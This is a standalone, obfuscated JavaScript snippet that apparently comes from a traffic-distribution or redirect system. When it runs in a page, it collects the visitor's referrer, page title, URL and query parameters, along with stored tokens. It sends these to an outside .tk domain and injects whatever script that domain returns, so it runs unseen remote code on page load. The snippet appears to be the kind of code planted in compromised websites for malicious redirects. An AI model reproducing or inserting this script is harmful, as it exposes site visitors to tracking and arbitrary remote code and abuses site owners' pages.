  (function() {
    var name = '_7rdzvHx8ktwTxNmv';
    if (!window._7rdzvHx8ktwTxNmv) {
        window._7rdzvHx8ktwTxNmv = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://perneyledisrio.tk/fashionnetworks',
            P_PATH: 'https://perneyledisrio.tk/fec84ce/postback',
        };
    }
    const _1V8QJXyRmrcwpFJP = localStorage.getItem('config');
    if (typeof _1V8QJXyRmrcwpFJP !== 'undefined' && _1V8QJXyRmrcwpFJP !== null) {
        var _pW89cs2ht1zVCyTk = JSON.parse(_1V8QJXyRmrcwpFJP);
        var _DTHGYGPjnDthGgkg = Math.round(+new Date()/1000);
        if (_pW89cs2ht1zVCyTk.created_at + window._7rdzvHx8ktwTxNmv.ttl < _DTHGYGPjnDthGgkg) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _N7mGN2jPwLtPZ2F1 = localStorage.getItem('subId');
    var _TgQYzzmd7d91q7GB = localStorage.getItem('token');
    var _7jLx5KNSYqmGd3Y9 = '?return=js.client';
        _7jLx5KNSYqmGd3Y9 += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _7jLx5KNSYqmGd3Y9 += '&se_referrer=' + encodeURIComponent(document.referrer);
        _7jLx5KNSYqmGd3Y9 += '&default_keyword=' + encodeURIComponent(document.title);
        _7jLx5KNSYqmGd3Y9 += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _7jLx5KNSYqmGd3Y9 += '&name=' + encodeURIComponent(name);
        _7jLx5KNSYqmGd3Y9 += '&host=' + encodeURIComponent(window._7rdzvHx8ktwTxNmv.R_PATH);
    if (typeof _N7mGN2jPwLtPZ2F1 !== 'undefined' && _N7mGN2jPwLtPZ2F1 && window._7rdzvHx8ktwTxNmv.unique) {
        _7jLx5KNSYqmGd3Y9 += '&sub_id=' + encodeURIComponent(_N7mGN2jPwLtPZ2F1);
    }
    if (typeof _TgQYzzmd7d91q7GB !== 'undefined' && _TgQYzzmd7d91q7GB && window._7rdzvHx8ktwTxNmv.unique) {
        _7jLx5KNSYqmGd3Y9 += '&token=' + encodeURIComponent(_TgQYzzmd7d91q7GB);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._7rdzvHx8ktwTxNmv.R_PATH + _7jLx5KNSYqmGd3Y9;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
